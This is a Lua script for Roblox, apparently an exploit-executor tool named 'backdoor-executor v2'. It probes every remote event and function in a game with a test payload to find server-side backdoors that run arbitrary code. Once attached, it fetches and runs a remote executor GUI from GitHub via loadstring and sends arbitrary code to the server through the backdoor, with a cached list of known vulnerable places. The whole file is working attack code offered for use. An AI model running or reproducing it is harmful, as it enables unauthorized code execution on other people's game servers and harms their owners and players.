-- services
local starterGui = game:GetService("StarterGui")
-- variables
local config
local configRaw = (
	if isfile("bexe-config.lua") then
		readfile("bexe-config.lua")
	else
		game:HttpGetAsync("https://raw.githubusercontent.com/jLn0n/created-scripts-public/main/backdoor-executor/bexe-config.lua")
)
local eventInfo = {
	["foundBackdoor"] = false,
	["instance"] = nil,
	["args"] = {"source"},
	["argSrcIndex"] = 1,
	["srcFunc"] = nil
}
local msgOutputs = {
	["attached"] = "\n Attached Event: %s\n Type: %s",
	["printEvent"] = "\n Event: %s\n Type: %s",
	["outdatedCache"] = "This game [%s] cache doesn't work, it might be outdated."
}
local testSource = [[local daValue=Instance.new("StringValue");daValue.Name,daValue.Parent,daValue.Value=game.PlaceId,workspace,"%s";task.delay(5, daValue.Destroy, daValue)]]
local scannedEvents = table.create(0)
-- functions
local function sendNotification(text)
	return starterGui:SetCore("SendNotification", {
		Title = "[backdoor-executor v2]",
		Text = text,
		Duration = 5
	})
end

local function pathToInstance(strPath)
	local pathSplit = string.split(strPath, ".")
	local result = game

	for _, pathName in pathSplit do
		if not result then return end
		result = result:FindFirstChild(pathName) or nil
	end
	return result
end

local function isRemoteAllowed(object)
	local objectFullName = object:GetFullName()

	if (config.blacklistSettings.eventNames[object.Name] or config.blacklistSettings.eventParentNames[object.Parent.Name]) or
		table.find(scannedEvents, object:GetFullName()) or
		(object:FindFirstChild("__FUNCTION") or object.Name == "__FUNCTION") or
		string.find(objectFullName, "MouseInfo") or string.find(objectFullName, "HDAdminClient") or
		string.find(objectFullName, "Basic Admin Essentials") or
		object.Parent == game:GetService("RobloxReplicatedStorage") then
		return false
	end
	return true
end

local function getEventFunc(object)
	return (
		if object:IsA("RemoteEvent") then
			object.FireServer
		elseif object:IsA("RemoteFunction") then
			object.InvokeServer
		else nil
	)
end

local function execScript(source)
	if eventInfo.instance then
		local eventFunc = getEventFunc(eventInfo.instance)
		eventInfo.args[eventInfo.argSrcIndex] = (if eventInfo.srcFunc then eventInfo.srcFunc(source) else source)

		task.spawn(eventFunc, eventInfo.instance, unpack(eventInfo.args))
	end
end

local function initializeEventObj(params)
	if eventInfo.instance then return end
	for name, value in params do
		eventInfo[name] = value
	end
end

local function onAttached(eventObj, params)
	if not eventObj then return end
	print(string.format(msgOutputs.attached, eventObj:GetFullName(), eventObj.ClassName))
	initializeEventObj(params or {
		["foundBackdoor"] = true,
		["instance"] = eventObj,
	})
	sendNotification("Attached!")

	loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/jLn0n/executor-gui/main/src/loader.lua"))({
		customExecution = true,
		executeFunc = execScript,
	})
	for _, scriptSrc in config.autoExec do
		execScript(scriptSrc)
	end
end

local function findBackdoors()
	if eventInfo.instance then return end

	for _, object in game:GetDescendants() do
		if object:IsA("RemoteEvent") or object:IsA("RemoteFunction") then
			if not isRemoteAllowed(object) then continue end
			print(string.format(msgOutputs.printEvent, object:GetFullName(), object.ClassName))
			local eventFunc, objectPath = getEventFunc(object), object:GetFullName()
			pcall(task.spawn, eventFunc, object, string.format(testSource, objectPath))

			local execResult = workspace:FindFirstChild(game.PlaceId)
			if execResult and execResult.Value ~= "" then
				onAttached(pathToInstance(execResult.Value))
				break
			end

			table.insert(scannedEvents, objectPath)
			task.wait()
		end
	end
	table.clear(scannedEvents)
end
-- main
do -- "initialization"?
	if not isfile("bexe-config.lua") then
		writefile("bexe-config.lua", configRaw)
	else
		local succ, loadedConfig = pcall(loadstring(configRaw))

		if (not succ) then
			sendNotification("Local configuration cannot be loaded, overwriting.")
			local newConfigRaw = game:HttpGetAsync("https://raw.githubusercontent.com/jLn0n/created-scripts-public/main/backdoor-executor/bexe-config.lua")

			writefile("bexe-config.lua", newConfigRaw)
			loadedConfig = loadstring(newConfigRaw)()
		end
		config = loadedConfig
	end
end
do -- backdoor finding
	sendNotification("Press F9 to see the remotes being scanned.")
	local placeCacheData = if (typeof(config) == "table" and config.cachedPlaces) then config.cachedPlaces[game.PlaceId] else nil

	if placeCacheData then
		local eventObj = pathToInstance(placeCacheData.Path)

		if eventObj then
			onAttached(eventObj, {
				["foundBackdoor"] = true,
				["instance"] = eventObj,
				["srcFunc"] = placeCacheData.SourceFunc,
				["args"] = placeCacheData.Args,
				["argSrcIndex"] = table.find(placeCacheData.Args, "source")
			})
		else
			warn(string.format(msgOutputs.outdatedCache, game.PlaceId))
		end
	end
	if (not placeCacheData or not eventInfo.foundBackdoor) then -- scan first
		findBackdoors()
	end

	if not eventInfo.foundBackdoor then -- if no backdoor found
		print("No backdoor(s) can be found here!")
		sendNotification("No backdoor(s) can be found here!")
	end
end
